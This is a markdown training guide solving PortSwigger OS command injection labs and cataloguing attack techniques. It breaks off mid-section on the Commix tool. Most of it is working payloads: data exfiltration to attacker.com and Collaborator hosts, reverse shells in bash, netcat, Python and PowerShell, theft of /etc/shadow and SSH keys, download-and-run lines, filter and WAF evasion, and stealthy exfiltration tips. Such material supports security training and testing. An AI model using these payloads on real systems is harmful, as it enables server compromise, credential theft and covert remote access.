# OS Command Injection - Complete PortSwigger Labs Guide

## Table of Contents
- [Introduction](#introduction)
- [Lab Solutions](#lab-solutions)
  - [Lab 1: OS command injection, simple case](#lab-1-os-command-injection-simple-case)
  - [Lab 2: Blind OS command injection with time delays](#lab-2-blind-os-command-injection-with-time-delays)
  - [Lab 3: Blind OS command injection with output redirection](#lab-3-blind-os-command-injection-with-output-redirection)
  - [Lab 4: Blind OS command injection with out-of-band interaction](#lab-4-blind-os-command-injection-with-out-of-band-interaction)
  - [Lab 5: Blind OS command injection with out-of-band data exfiltration](#lab-5-blind-os-command-injection-with-out-of-band-data-exfiltration)
- [Attack Techniques](#attack-techniques)
- [Command Separators and Metacharacters](#command-separators-and-metacharacters)
- [Bypass Techniques](#bypass-techniques)
- [Detection Methods](#detection-methods)
- [Burp Suite Workflows](#burp-suite-workflows)
- [Tools and Automation](#tools-and-automation)
- [Real-World CVE Examples](#real-world-cve-examples)
- [Prevention and Defense](#prevention-and-defense)
- [References](#references)

---

## Introduction

OS command injection (also known as shell injection) is a critical web security vulnerability that allows an attacker to execute arbitrary operating system commands on the server running an application. This typically occurs when user-supplied input is passed directly to system shell execution functions without proper validation or sanitization.

### Key Concepts

**What makes OS command injection dangerous?**
- Full system compromise with web server privileges
- Data theft and manipulation
- Lateral movement within internal networks
- Installation of backdoors and malware
- Complete denial of service

**Types of OS Command Injection:**
1. **Direct (In-band)**: Command output is returned in the application response
2. **Blind**: No output is returned, requiring inference techniques
3. **Out-of-band**: Data is exfiltrated through alternative channels (DNS, HTTP)

---

## Lab Solutions

### Lab 1: OS command injection, simple case

**Difficulty:** Apprentice
**Objective:** Execute the `whoami` command to identify the current user

#### Vulnerability Description

The application features a product stock checker that processes user-supplied product and store IDs within a shell command. The system returns unfiltered output from the executed command in its response, creating a direct command injection point.

#### Vulnerable Code Pattern

```php
// Vulnerable PHP example
$storeId = $_POST['storeId'];
$productId = $_POST['productId'];
$result = shell_exec("stockCheck.sh $productId $storeId");
echo $result;
```

#### Step-by-Step Solution

**1. Identify the vulnerable endpoint**
- Navigate to any product page
- Click "Check stock"
- Observe the stock checking request

**2. Intercept the request in Burp Suite**
```http
POST /product/stock HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 20

productId=1&storeId=1
```

**3. Test for command injection**

Modify the `storeId` parameter to inject a command using the pipe operator:

```http
productId=1&storeId=1|whoami
```

**Alternative payloads:**
```
storeId=1;whoami
storeId=1&&whoami
storeId=1||whoami
storeId=1`whoami`
storeId=1$(whoami)
storeId=1%0awhoami
```

**4. Observe the response**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

23 units
peter-tMz8Aw
```

The response shows both the stock quantity and the username `peter-tMz8Aw`, confirming successful command injection.

#### Why This Works

- The pipe character `|` chains commands in Unix/Linux shells
- The first command executes regardless of success
- Output from both commands is returned in the response
- No input validation or sanitization is performed

#### Common Mistakes

❌ **URL encoding when not needed**: The parameter is already in POST body
❌ **Using Windows separators on Linux**: `&` behaves differently than `&&`
❌ **Forgetting to check the response body**: Output may appear below error messages

✅ **Best approach**: Start with simple separators (`|`, `;`) before trying advanced techniques

---

### Lab 2: Blind OS command injection with time delays

**Difficulty:** Practitioner
**Objective:** Exploit the blind OS command injection vulnerability to cause a 10 second delay

#### Vulnerability Description

The application processes user-supplied feedback containing a shell command execution vulnerability. The key characteristic is that "The output from the command is not returned in the response," making this a blind injection scenario where attackers cannot see direct output.

#### Vulnerable Code Pattern

```python
# Vulnerable Python example
def submit_feedback(email, subject, message):
    cmd = f"./processFeedback.sh '{email}' '{subject}' '{message}'"
    subprocess.Popen(cmd, shell=True)  # Asynchronous execution
    return "Feedback submitted"
```

#### Step-by-Step Solution

**1. Locate the feedback form**
- Navigate to the feedback submission page
- Fill in any values for testing

**2. Intercept the feedback submission**

```http
POST /feedback/submit HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

name=test&email=test@test.com&subject=test&message=test
```

**3. Inject time-delay payload**

Modify the `email` parameter:

```http
email=x||ping+-c+10+127.0.0.1||
```

**URL decoded payload:**
```
email=x||ping -c 10 127.0.0.1||
```

**4. Observe the response delay**

Time the request - it should take approximately 10 seconds to complete, confirming command execution.

#### Payload Explanation

- `x`: Dummy command that fails
- `||`: OR operator - executes next command if previous fails
- `ping -c 10 127.0.0.1`: Sends 10 ICMP packets to localhost (1 second per packet)
- `||`: Trailing OR operator for syntax completion

#### Alternative Time-Delay Payloads

**Linux/Unix:**
```bash
|| sleep 10 ||
; sleep 10 ;
| sleep 10 |
`sleep 10`
$(sleep 10)
%0asleep 10%0a
|| timeout 10 ||
|| ping -c 10 127.0.0.1 ||
```

**Windows:**
```cmd
|| ping -n 11 127.0.0.1 ||
|| timeout /t 10 ||
& ping -n 11 127.0.0.1 &
& timeout /t 10 &
```

**Multi-platform (Python example):**
```python
|| python -c "import time; time.sleep(10)" ||
```

#### Detection Methodology

**Time-based blind detection steps:**

1. **Establish baseline**: Time a normal request
2. **Inject time-delay payload**: Compare response time
3. **Vary delay duration**: Test with 5s, 10s, 15s to confirm control
4. **Rule out network latency**: Repeat tests multiple times

**Burp Suite time measurement:**
- Use Burp Repeater's response timer (bottom right)
- Send request multiple times to eliminate false positives
- Look for consistent delay matching payload duration

#### Common Mistakes

❌ **Using `ping` with wrong flag**: `-n` is Windows, `-c` is Unix/Linux
❌ **Too short delays**: Network latency might mask 1-2 second delays
❌ **Not accounting for command execution time**: Add buffer to expected delay
❌ **Testing on wrong parameter**: Try all input fields systematically

✅ **Best approach**: Use 10-second delay for clear, unambiguous confirmation

#### Real-World Applications

Time-based blind command injection is particularly useful for:
- Confirming vulnerability when output is suppressed
- Bypassing WAF detection (no exfiltration traffic)
- Testing in environments with strict egress filtering
- Initial vulnerability discovery before attempting extraction

---

### Lab 3: Blind OS command injection with output redirection

**Difficulty:** Practitioner
**Objective:** Execute the `whoami` command and retrieve output via file system

#### Vulnerability Description

The application processes user input in its feedback feature by executing shell commands. While command output isn't directly returned in responses, attackers can exploit output redirection to capture results in a web-accessible directory.

#### Vulnerable Code Pattern

```ruby
# Vulnerable Ruby example
def process_feedback(params)
  email = params[:email]
  subject = params[:subject]
  system("logger 'Feedback from: #{email}, Subject: #{subject}'")
  render json: { status: "submitted" }
end
```

#### Step-by-Step Solution

**1. Identify web-accessible directory**

The lab provides a hint that `/var/www/images/` serves product catalog images. This is our target for output redirection.

**2. Intercept feedback submission**

```http
POST /feedback/submit HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&name=test&email=test@test.com&subject=test&message=test
```

**3. Inject output redirection payload**

Modify the `email` parameter:

```http
email=||whoami>/var/www/images/output.txt||
```

**URL decoded:**
```bash
||whoami>/var/www/images/output.txt||
```

**4. Retrieve the output file**

Navigate to or make a request to:
```
GET /image?filename=output.txt HTTP/1.1
```

Or modify an existing image load request:
```http
GET /product/image?filename=output.txt HTTP/1.1
```

**5. Observe the response**

```http
HTTP/1.1 200 OK
Content-Type: text/plain

peter-QRXY91
```

#### Payload Explanation

- `||`: OR operator for command chaining
- `whoami`: Command to execute
- `>`: Output redirection operator
- `/var/www/images/output.txt`: Writable, web-accessible path
- `||`: Trailing operator for syntax completion

#### Output Redirection Operators

**Linux/Unix operators:**

| Operator | Description | Example |
|----------|-------------|---------|
| `>` | Overwrite file | `whoami > /tmp/out.txt` |
| `>>` | Append to file | `id >> /tmp/out.txt` |
| `2>` | Redirect stderr | `whoami 2> /tmp/err.txt` |
| `2>&1` | Merge stderr to stdout | `whoami > /tmp/out.txt 2>&1` |
| `&>` | Redirect both stdout/stderr | `whoami &> /tmp/out.txt` |
| `tee` | Write to file and stdout | `whoami \| tee /tmp/out.txt` |

#### Finding Writable Directories

**Common web-accessible directories:**
```bash
/var/www/html/
/var/www/images/
/usr/share/nginx/html/
/var/www/uploads/
/tmp/ (may not be web-accessible)
/opt/app/static/
/app/public/
```

**Testing for write permissions:**
```bash
|| echo test123 > /var/www/images/test.txt ||
|| touch /var/www/html/test.txt ||
|| whoami > /tmp/test && cat /tmp/test > /var/www/html/out.txt ||
```

#### Advanced Techniques

**Multi-command extraction:**
```bash
|| cat /etc/passwd > /var/www/images/passwd.txt ||
|| ls -la /home > /var/www/images/homedir.txt ||
|| env > /var/www/images/env.txt ||
|| ps aux > /var/www/images/processes.txt ||
```

**Base64 encoding for binary/special characters:**
```bash
|| cat /etc/passwd | base64 > /var/www/images/passwd_b64.txt ||
```

**Chaining commands to ensure success:**
```bash
|| mkdir /var/www/images/test && whoami > /var/www/images/test/out.txt ||
```

#### Common Mistakes

❌ **Wrong file path**: Test with `ls -la /var/www/` to enumerate structure
❌ **Permission denied**: Try alternative directories like `/tmp/`
❌ **Special characters in filename**: Use simple alphanumeric names
❌ **Retrieving before writing completes**: Wait a few seconds for async operations

✅ **Best approach**: Test with simple `echo` command first, then extract sensitive data

#### Burp Suite Workflow

1. **Repeater Tab 1**: Send injection payload
2. **Repeater Tab 2**: Retrieve output file
3. **Intruder**: Enumerate writable directories systematically
4. **Proxy History**: Find legitimate file retrieval patterns to mimic

---

### Lab 4: Blind OS command injection with out-of-band interaction

**Difficulty:** Practitioner
**Objective:** Exploit blind OS command injection to issue DNS lookup to Burp Collaborator

#### Vulnerability Description

The application processes user feedback containing an OS command injection flaw. The vulnerability exists because the application "executes a shell command containing the user-supplied details" asynchronously without reflecting output in the response. This prevents standard output redirection techniques, requiring out-of-band interaction methods instead.

#### Vulnerable Code Pattern

```java
// Vulnerable Java example
public void processFeedback(String email, String message) {
    String command = String.format("./feedbackHandler.sh \"%s\" \"%s\"", email, message);
    Runtime.getRuntime().exec(command);
    // Returns immediately, no output captured
}
```

#### Step-by-Step Solution

**1. Setup Burp Collaborator**

In Burp Suite Professional:
- Go to **Burp menu** → **Burp Collaborator client**
- Click **"Copy to clipboard"** to get a unique subdomain
- Example: `BURP-COLLABORATOR-SUBDOMAIN.burpcollaborator.net`

**2. Intercept feedback submission**

```http
POST /feedback/submit HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&name=test&email=test@test.com&subject=test&message=test
```

**3. Inject out-of-band payload**

Modify the `email` parameter:

```http
email=x||nslookup+x.BURP-COLLABORATOR-SUBDOMAIN||
```

**URL decoded:**
```bash
x||nslookup x.BURP-COLLABORATOR-SUBDOMAIN||
```

**Full example:**
```bash
x||nslookup x.abc123xyz.burpcollaborator.net||
```

**4. Poll Burp Collaborator**

Return to the Collaborator client and click **"Poll now"**. You should see DNS queries:

```
DNS Query:
  Type: A
  Query: x.abc123xyz.burpcollaborator.net
  Source IP: TARGET-SERVER-IP
```

This confirms successful command execution.

#### Out-of-Band Techniques

**DNS-based payloads:**

```bash
# nslookup (Windows/Linux)
|| nslookup burpcollaborator.net ||
|| nslookup `whoami`.burpcollaborator.net ||

# dig (Linux)
|| dig burpcollaborator.net ||
|| dig @8.8.8.8 burpcollaborator.net ||

# host (Linux)
|| host burpcollaborator.net ||
```

**HTTP-based payloads:**

```bash
# curl (Linux/macOS)
|| curl https://burpcollaborator.net ||
|| curl http://burpcollaborator.net/$(whoami) ||

# wget (Linux)
|| wget http://burpcollaborator.net ||
|| wget --post-data=$(whoami) http://burpcollaborator.net ||

# PowerShell (Windows)
|| powershell -c "Invoke-WebRequest http://burpcollaborator.net" ||
```

**ICMP-based payloads:**

```bash
# ping (Windows/Linux)
|| ping -c 4 burpcollaborator.net ||
|| ping -n 4 burpcollaborator.net ||  # Windows
```

#### Why Out-of-Band Detection Works

**Advantages:**
- Works when output is not returned
- Bypasses output filtering/sanitization
- Can exfiltrate data through DNS/HTTP
- Often bypasses application-level logging
- Confirms execution even with strict security controls

**Requirements:**
- Target must allow outbound DNS/HTTP/ICMP
- Attacker must control external server (Burp Collaborator)
- Firewall must not block specific protocols

#### Network Restrictions

The lab mentions: "The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response. It is not possible to redirect output into a location that you can access. However, you can trigger out-of-band interactions with an external domain."

**Testing network restrictions:**

| Protocol | Test Command | Typical Firewall Behavior |
|----------|-------------|---------------------------|
| DNS | `nslookup` | Usually allowed (port 53) |
| HTTP/HTTPS | `curl`, `wget` | Often restricted |
| ICMP | `ping` | Often blocked outbound |
| SMB | `\\attacker\share` | Usually blocked |

#### Common Mistakes

❌ **Using HTTP when DNS is required**: Try DNS first for better success rate
❌ **Not URL encoding the payload**: Use `+` for spaces or `%20`
❌ **Forgetting to poll Collaborator**: Interactions don't appear automatically
❌ **Testing without Burp Pro**: Collaborator requires Professional license

✅ **Best approach**: Start with simple DNS lookup, then advance to data exfiltration

#### Burp Suite Workflow

**Method 1: Manual payload insertion**
1. Copy Collaborator subdomain
2. Craft payload manually: `||nslookup SUBDOMAIN||`
3. Send request
4. Poll Collaborator for interactions

**Method 2: Context menu shortcut**
1. Right-click parameter value in Repeater
2. Select **"Insert Collaborator payload"**
3. Burp automatically inserts and monitors
4. View results in Collaborator tab

**Method 3: Intruder with Collaborator**
1. Set injection point: `§x||nslookup burpcollaborator.net||§`
2. Use Collaborator payloads list
3. Automatic polling and detection

---

### Lab 5: Blind OS command injection with out-of-band data exfiltration

**Difficulty:** Practitioner
**Objective:** Execute `whoami` and exfiltrate output via DNS to Burp Collaborator

#### Vulnerability Description

The feedback function contains a blind OS command injection flaw. "The application executes a shell command containing the user-supplied details. The command is executed asynchronously and has no effect on the application's response." Output redirection to accessible locations is prevented, but out-of-band interactions with external domains are possible.

#### Vulnerable Code Pattern

```go
// Vulnerable Go example
func processFeedback(email, message string) {
    cmd := fmt.Sprintf("./processFeedback.sh '%s' '%s'", email, message)
    exec.Command("bash", "-c", cmd).Start()
    // Asynchronous execution, no output captured
}
```

#### Step-by-Step Solution

**1. Setup Burp Collaborator and copy payload**

- Navigate to **Burp menu** → **Burp Collaborator client**
- Click **"Copy to clipboard"**
- Example subdomain: `abc123xyz.burpcollaborator.net`

**2. Intercept feedback request**

```http
POST /feedback/submit HTTP/1.1
Host: TARGET.web-security-academy.net
Content-Type: application/x-www-form-urlencoded

csrf=TOKEN&name=test&email=test@test.com&subject=test&message=test
```

**3. Inject data exfiltration payload**

Modify the `email` parameter with command substitution:

```http
email=||nslookup+`whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

**URL decoded:**
```bash
||nslookup `whoami`.BURP-COLLABORATOR-SUBDOMAIN||
```

**Full example:**
```bash
||nslookup `whoami`.abc123xyz.burpcollaborator.net||
```

**4. Poll Burp Collaborator**

Wait a few seconds for async command execution, then click **"Poll now"** in Collaborator client.

**Expected DNS interaction:**
```
DNS Query:
  Type: A
  Query: peter-8xYz31.abc123xyz.burpcollaborator.net
  Source IP: TARGET-SERVER-IP
```

**5. Extract username**

The subdomain shows: `peter-8xYz31.abc123xyz.burpcollaborator.net`

The username is: **peter-8xYz31**

**6. Submit the solution**

Enter the username in the lab solution field to complete the challenge.

#### Command Substitution Techniques

**Backticks (works on Unix/Linux):**
```bash
nslookup `whoami`.burpcollaborator.net
nslookup `id`.burpcollaborator.net
```

**Dollar-parentheses (works on Unix/Linux, preferred):**
```bash
nslookup $(whoami).burpcollaborator.net
nslookup $(id).burpcollaborator.net
```

**PowerShell (Windows):**
```powershell
nslookup $env:USERNAME.burpcollaborator.net
nslookup $(whoami).burpcollaborator.net
```

#### Data Exfiltration Payloads

**Basic information gathering:**

```bash
# Username
||nslookup `whoami`.burpcollaborator.net||

# Hostname
||nslookup `hostname`.burpcollaborator.net||

# Current directory
||nslookup `pwd|tr '/' '-'`.burpcollaborator.net||

# User ID
||nslookup `id|base64`.burpcollaborator.net||

# IP address
||nslookup `hostname -I|tr ' ' '-'`.burpcollaborator.net||
```

**File content exfiltration:**

```bash
# Single line file
||nslookup `cat /etc/hostname`.burpcollaborator.net||

# Multi-line with base64
||nslookup `cat /etc/passwd|base64|head -1`.burpcollaborator.net||

# Specific field extraction
||nslookup `cat /etc/passwd|cut -d: -f1|head -1`.burpcollaborator.net||
```

**Environment variables:**

```bash
# Linux
||nslookup `echo $USER`.burpcollaborator.net||
||nslookup `echo $HOME|tr '/' '-'`.burpcollaborator.net||

# Windows
||nslookup %USERNAME%.burpcollaborator.net||
||nslookup %COMPUTERNAME%.burpcollaborator.net||
```

#### DNS Exfiltration Limitations

**DNS label length restrictions:**
- Maximum label length: 63 characters
- Maximum domain name length: 253 characters
- Labels separated by dots

**Handling long outputs:**

```bash
# Chunking approach
||nslookup `cat /etc/passwd|head -1|cut -c1-50`.burpcollaborator.net||

# Base64 encoding (reduces special chars)
||nslookup `echo 'data'|base64`.burpcollaborator.net||

# Using tr to replace special characters
||nslookup `whoami|tr -d '\n'`.burpcollaborator.net||
||nslookup `cat /etc/passwd|tr ':' '-'|head -1`.burpcollaborator.net||
```

#### HTTP-Based Data Exfiltration

For larger data, HTTP allows more bandwidth than DNS:

```bash
# GET request with data in path
||curl http://burpcollaborator.net/`whoami`||

# GET request with data in parameter
||curl "http://burpcollaborator.net/?data=`whoami|base64`"||

# POST request with data in body
||curl -X POST -d "`cat /etc/passwd`" http://burpcollaborator.net||

# POST with base64 encoded data
||curl -X POST -d "`cat /etc/passwd|base64`" http://burpcollaborator.net||

# Using wget
||wget --post-data="`whoami`" http://burpcollaborator.net||
```

#### Advanced Exfiltration Techniques

**Multi-stage exfiltration:**

```bash
# Stage 1: Enumerate files
||nslookup `ls /etc|wc -l`.stage1.burpcollaborator.net||

# Stage 2: Get specific file
||nslookup `cat /etc/hostname`.stage2.burpcollaborator.net||

# Stage 3: Extract credentials
||nslookup `grep password config.php|base64`.stage3.burpcollaborator.net||
```

**Bypassing character restrictions:**

```bash
# Using hex encoding
||nslookup `whoami|xxd -p`.burpcollaborator.net||

# Using base32
||nslookup `whoami|base32`.burpcollaborator.net||

# Character substitution
||nslookup `whoami|sed 's/[^a-z]/-/g'`.burpcollaborator.net||
```

**Exfiltrating multiple lines:**

```bash
# Send line by line
for line in $(cat /etc/passwd); do nslookup $line.burpcollaborator.net; done

# Compress and encode
||nslookup `cat /etc/passwd|gzip|base64|head -c 50`.burpcollaborator.net||
```

#### Common Mistakes

❌ **Special characters in DNS labels**: Use base64 or character substitution
❌ **Exceeding DNS length limits**: Chunk data or use HTTP instead
❌ **Not URL encoding the payload**: Spaces and special chars must be encoded
❌ **Forgetting command substitution**: Use backticks or `$()` for execution
❌ **Not waiting for async execution**: Allow 5-10 seconds before polling

✅ **Best approach**: Test with simple `whoami` first, then scale to larger extractions

#### Burp Suite Workflow

**Professional workflow for data exfiltration:**

1. **Collaborator Client**: Copy subdomain
2. **Repeater**: Craft injection payload with command substitution
3. **Send request**: Submit the payload
4. **Wait**: Allow time for asynchronous execution
5. **Collaborator Client**: Poll for interactions
6. **Description tab**: View exfiltrated data in subdomain
7. **Iterate**: Refine payload based on data received

**Parsing exfiltrated data:**

```python
# Example: Extract username from DNS query
dns_query = "peter-8xYz31.abc123xyz.burpcollaborator.net"
username = dns_query.split('.')[0]
print(f"Username: {username}")
```

#### Real-World Considerations

**Defensive measures that may block exfiltration:**

- DNS query logging and anomaly detection
- Outbound traffic filtering (whitelist approach)
- DNS response policy zones (RPZ)
- Data Loss Prevention (DLP) systems
- Network behavior analysis

**Stealthier exfiltration techniques:**

- Use legitimate-looking subdomains
- Slow down exfiltration rate (avoid bursts)
- Use trusted DNS servers as relays
- Encrypt/obfuscate exfiltrated data
- Blend with normal application traffic patterns

---

## Attack Techniques

### Direct Command Injection

When application returns command output directly in the response:

```bash
# Simple execution
productId=1|whoami
productId=1;id
productId=1`uname -a`
productId=1$(hostname)

# Multiple commands
productId=1|whoami|hostname|id
productId=1;cat /etc/passwd;cat /etc/hostname;

# Command chaining with logic
productId=1&&whoami  # Executes if first succeeds
productId=1||whoami  # Executes if first fails
```

### Blind Command Injection

When no output is returned, use inference techniques:

#### Time-Based Detection

```bash
# Linux/Unix
||sleep 10||
;sleep 10;
|sleep 10|
`sleep 10`
$(sleep 10)

# Alternative time commands
||timeout 10||
||ping -c 10 127.0.0.1||

# Windows
||timeout /t 10||
||ping -n 11 127.0.0.1||
& timeout /t 10 &
```

#### Output Redirection

```bash
# Basic redirection
||whoami>/var/www/html/out.txt||

# Append mode
||id>>/var/www/html/out.txt||

# Redirect stderr
||ls /root 2>/var/www/html/err.txt||

# Combined stdout and stderr
||cat /etc/shadow &>/var/www/html/shadow.txt||
```

#### Out-of-Band Techniques

```bash
# DNS exfiltration
||nslookup $(whoami).attacker.com||
||dig `id`.attacker.com||

# HTTP exfiltration
||curl http://attacker.com/$(whoami)||
||wget http://attacker.com/?data=`cat /etc/passwd|base64`||

# ICMP exfiltration
||ping -c 1 attacker.com||
```

### Multi-Line Command Injection

```bash
# Using newline character
%0awhoami%0a
\nwhoami\n

# Using semicolon
;whoami;

# Heredoc (advanced)
cat <<EOF
whoami
id
hostname
EOF
```

### Advanced Exploitation

#### Reverse Shell

```bash
# Bash reverse shell
||bash -i >& /dev/tcp/attacker.com/4444 0>&1||

# Netcat reverse shell
||nc attacker.com 4444 -e /bin/sh||
||rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc attacker.com 4444 >/tmp/f||

# Python reverse shell
||python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'||

# PowerShell reverse shell (Windows)
||powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('attacker.com',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"||
```

#### Data Extraction

```bash
# Read sensitive files
||cat /etc/passwd>/var/www/html/passwd.txt||
||cat /etc/shadow>/var/www/html/shadow.txt||
||cat ~/.ssh/id_rsa>/var/www/html/key.txt||

# Extract credentials
||grep -r "password" /var/www/>/var/www/html/creds.txt||
||find / -name "*.conf" -exec grep -H "password" {} \;>/var/www/html/configs.txt||

# Database credentials
||cat /var/www/html/config.php>/var/www/html/dbcreds.txt||
||env | grep -i pass>/var/www/html/env.txt||
```

#### Privilege Escalation Enumeration

```bash
# Check current privileges
||id>/var/www/html/id.txt||
||sudo -l>/var/www/html/sudo.txt||

# Find SUID binaries
||find / -perm -4000 2>/dev/null>/var/www/html/suid.txt||

# Check cron jobs
||cat /etc/crontab>/var/www/html/cron.txt||
||crontab -l>/var/www/html/usercron.txt||

# Check writable directories
||find / -writable -type d 2>/dev/null>/var/www/html/writable.txt||
```

---

## Command Separators and Metacharacters

### Unix/Linux Command Separators

| Separator | Description | Example | Use Case |
|-----------|-------------|---------|----------|
| `;` | Sequential execution | `cmd1;cmd2` | Execute regardless of success |
| `\|` | Pipe output | `cmd1\|cmd2` | Feed output to next command |
| `\|\|` | Logical OR | `cmd1\|\|cmd2` | Execute cmd2 if cmd1 fails |
| `&&` | Logical AND | `cmd1&&cmd2` | Execute cmd2 if cmd1 succeeds |
| `&` | Background execution | `cmd1&cmd2` | Run cmd1 in background |
| `` ` `` | Command substitution | ``cmd1 `cmd2` `` | Execute cmd2, use output in cmd1 |
| `$()` | Command substitution | `cmd1 $(cmd2)` | Modern alternative to backticks |
| `\n` | Newline | `cmd1%0acmd2` | Separate commands (URL encoded) |
| `%0a` | Newline (URL encoded) | `cmd1%0acmd2` | Web payloads |

### Windows Command Separators

| Separator | Description | Example | Platform |
|-----------|-------------|---------|----------|
| `&` | Sequential execution | `cmd1&cmd2` | cmd.exe |
| `\|` | Pipe output | `cmd1\|cmd2` | cmd.exe |
| `\|\|` | Logical OR | `cmd1\|\|cmd2` | cmd.exe |
| `&&` | Logical AND | `cmd1&&cmd2` | cmd.exe |
| `;` | Command separator | `cmd1;cmd2` | PowerShell only |

### Shell Metacharacters to Test

```bash
# Basic metacharacters
; | & $ > < ` \ !

# Extended metacharacters
|| && ( ) [ ] { } * ? ~ ^ # % @ ! -

# Whitespace alternatives
${IFS}     # Internal Field Separator
$IFS$9     # IFS with empty variable
{cat,/etc/passwd}  # Brace expansion
<space>    # Actual space
%09        # Tab (URL encoded)
%20        # Space (URL encoded)
```

### Testing Strategy

**Systematic testing approach:**

1. **Basic separators**: `;`, `|`, `||`, `&&`, `&`
2. **Command substitution**: `` ` ``, `$()`
3. **Newline injection**: `%0a`, `\n`
4. **Advanced techniques**: Brace expansion, IFS substitution
5. **Platform-specific**: Test Windows and Unix variants

---

## Bypass Techniques

### Input Validation Bypass

#### Blacklist Bypasses

**Scenario**: Application blocks common separators like `;`, `|`, `&`

```bash
# Newline injection
%0awhoami%0a
\nwhoami\n

# Using variables
${IFS}whoami
$IFS$9whoami

# Brace expansion
{cat,/etc/passwd}

# Wildcard expansion
/bin/cat${IFS}/etc/passw?

# Hex encoding
\x0awhoami\x0a
```

#### Space Filtering Bypass

**Scenario**: Application blocks spaces

```bash
# Using IFS (Internal Field Separator)
cat${IFS}/etc/passwd
cat${IFS}${PATH:0:1}etc${PATH:0:1}passwd

# Using tabs
cat%09/etc/passwd

# Using brace expansion
{cat,/etc/passwd}

# Using < redirect
cat</etc/passwd

# Using $IFS with parameters
cat$IFS/etc/passwd
cat$IFS$9/etc/passwd
```

#### Slash Filtering Bypass

**Scenario**: Application blocks `/` character

```bash
# Using environment variables
cat${PATH:0:1}etc${PATH:0:1}passwd

# Using variable expansion
SLASH=/
cat ${SLASH}etc${SLASH}passwd

# Using printf
cat $(printf '\x2f')etc$(printf '\x2f')passwd
```

#### Keyword Filtering Bypass

**Scenario**: Application blocks specific commands like `cat`, `whoami`, `wget`

```bash
# Using wildcards
/bin/c?t /etc/passwd
/bin/wh*ami
/usr/bin/wge?

# Using quotes
c''at /etc/passwd
c""at /etc/passwd
c\at /etc/passwd

# Using variables
a=w;b=hoami;$a$b
CMD=cat;$CMD /etc/passwd

# Using backslashes
c\a\t /etc/passwd
wh\oa\mi

# Case manipulation (Windows)
WhOaMi
CAT C:\Windows\win.ini

# Base64 encoding
echo d2hvYW1p|base64 -d|bash
echo Y2F0IC9ldGMvcGFzc3dk|base64 -d|bash

# Hex encoding
echo -e "\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64"|bash
```

### Length Restriction Bypass

**Scenario**: Limited input length

```bash
# Short commands
id
w
ls
ps

# Using aliases
alias c=cat
c /etc/passwd

# Multi-stage approach
# Request 1: Create file with command
echo 'cat /etc/passwd'>/tmp/x

# Request 2: Execute
sh /tmp/x

# Download and execute
curl x.co/s|sh
wget -O- x.co/s|sh
```

### WAF/IDS Bypass

#### Encoding Techniques

```bash
# URL encoding
%63%61%74%20%2f%65%74%63%2f%70%61%73%73%77%64

# Double URL encoding
%25%36%33%25%36%31%25%37%34

# Unicode encoding
\u0063\u0061\u0074

# Hex encoding
\x63\x61\x74
```

#### Obfuscation Techniques

```bash
# Using wildcards
/???/c?t /???/p??s??

# Using character insertion
w$@h$@o$@a$@m$@i
c""a""t /et""c/pa""sswd

# Using concatenation
a=wh;b=oami;$a$b
who$()ami

# Mixed case (Windows)
WhOaMi /AlL
```

#### Time-Based Bypass

```bash
# Slow down execution to avoid rate limiting
sleep 1;whoami;sleep 1

# Stagger commands
whoami&sleep 5&id

# Use timeouts
timeout 1 cat /etc/passwd
```

### Contextual Bypass

#### Escaping String Context

**Scenario**: Input is wrapped in single quotes

```bash
# Vulnerable code: system("command '$input'")

# Escape and inject
' ; whoami ; '
' && whoami && '
' || whoami || '
'`whoami`'
'$(whoami)'
```

**Scenario**: Input is wrapped in double quotes

```bash
# Vulnerable code: system("command \"$input\"")

# Escape and inject
" ; whoami ; "
" && whoami && "
"`whoami`"
"$(whoami)"
```

#### Breaking Out of Subshells

```bash
# Nested command execution
$(echo whoami)
`echo whoami`

# Using eval
eval whoami
```

---

## Detection Methods

### Manual Testing

#### Basic Detection

**Step 1: Test for time delays**
```
parameter=test||sleep 5||
parameter=test;sleep 5;
parameter=test|sleep 5|
```

**Step 2: Test for output reflection**
```
parameter=test|whoami
parameter=test;id
parameter=test&&hostname
```

**Step 3: Test for out-of-band**
```
parameter=test||nslookup attacker.com||
parameter=test;curl http://attacker.com;
```

#### Systematic Parameter Testing

Test all injection points:
- URL parameters: `?id=1&category=test`
- POST body parameters
- HTTP headers: `User-Agent`, `Referer`, `X-Forwarded-For`
- Cookies
- File upload filenames
- Hidden form fields

### Automated Detection

#### Using Burp Suite Scanner

**Active Scan configuration:**
1. Navigate to **Target** → **Site map**
2. Right-click target → **Actively scan this host**
3. Enable **OS command injection** in scan configuration
4. Review issues in **Dashboard** → **Issue activity**

**Intruder-based detection:**

```
POST /api/feedback HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

email=test§||sleep 5||§
```

**Payload list:**
```
||sleep 5||
;sleep 5;
|sleep 5|
`sleep 5`
$(sleep 5)
```

**Attack type**: Sniper
**Grep - Extract**: Look for time delays in response times

#### Using Commix

Commix (Command Injection Exploiter) automates OS command injection detection and exploitation:

**Basic usage:**
```bash
# Test single parameter
commix --url="http://target.com/page?id=1"

# Test POST parameters
commix --url="http://target.com/submit" --data="name=test&email=test@test.com"

# Test specific parameter
commix --url="http://target.com/page" --data="email=test" -p email

# Test with authentication
